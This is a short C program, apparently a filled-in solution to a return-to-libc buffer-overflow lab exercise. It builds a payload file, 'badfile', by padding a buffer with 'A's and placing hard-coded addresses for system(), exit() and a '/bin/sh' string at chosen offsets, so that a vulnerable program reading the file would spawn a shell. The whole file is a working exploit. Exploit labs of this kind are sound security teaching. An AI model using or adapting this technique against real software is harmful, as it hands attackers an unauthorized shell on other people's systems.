/* exploit2.c */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
	char buf[60];
	memset(buf, 'A', sizeof(buf));

	FILE *badfile;

	badfile = fopen("./badfile","w");

	/* You need to decide the addresses and 
	   the values of X, Y, Z. The order of 
	   the following three statements do not 
	   imply the order of X, Y, Z.
	*/
	//char input[]="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\x42\xe4\xb7\xd0\x69\xe3\xb7\xc1\xff\xff\xbf";
	
	
	//first injected all As in the buffer
	memset(buf, 'A', sizeof(buf));
	*(long *)(buf + 36) = 0xb7e42da0; // Address of system()
	*(long *)(buf + 40) = 0xb7e369d0; // Address of exit()
	*(long *)(buf + 44) = 0xbfffffc1; // Address of "/bin/sh"


	fwrite(buf, sizeof(buf), 1, badfile);
	
	
	fclose(badfile);
}
